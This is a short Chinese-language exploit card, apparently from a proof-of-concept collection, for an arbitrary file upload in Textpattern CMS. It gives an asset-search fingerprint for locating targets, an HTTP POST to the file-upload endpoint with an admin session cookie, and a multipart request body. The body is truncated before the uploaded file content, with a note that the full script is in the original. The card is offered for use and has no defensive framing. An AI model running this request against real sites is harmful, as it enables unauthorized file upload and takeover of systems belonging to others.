# textpantterncms任意文件上传

- **系统**：textpantterncms　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="Textpattern-CMS"`
- **请求**：`POST /textpattern/textpattern/index.php?event=file HTTP/1.1`
- **关键头**：`X-Requested-With: XMLHttpRequest`　`Content-Type: multipart/form-data; boundary=---------------------------501…`　`Cookie: txp_login=admin%2C8303b159c13c22402a789348e7dbd46d; txp_login_public=cfeff738eda…`

**请求体 / payload**
```
-----------------------------50124112016268391132465212078
Content-Disposition: form-data; name="fileInputOrder"
1/1
-----------------------------50124112016268391132465212078
Content-Disposition: form-data; name="app_mode"
async
-----------------------------50124112016268391132465212078
Content-Disposition: form-data; name="MAX_FILE_SIZE"
2000000
-----------------------------50124112016268391132465212078
Content-Disposition: form-data; name="event"
file
-----------------------------50124112016268391132465212078
Content-Disposition: form-data; name="step"
file_insert
--------------------------…（脚本共 1068 字，完整版见原文）
```
- **预期**：200　|　—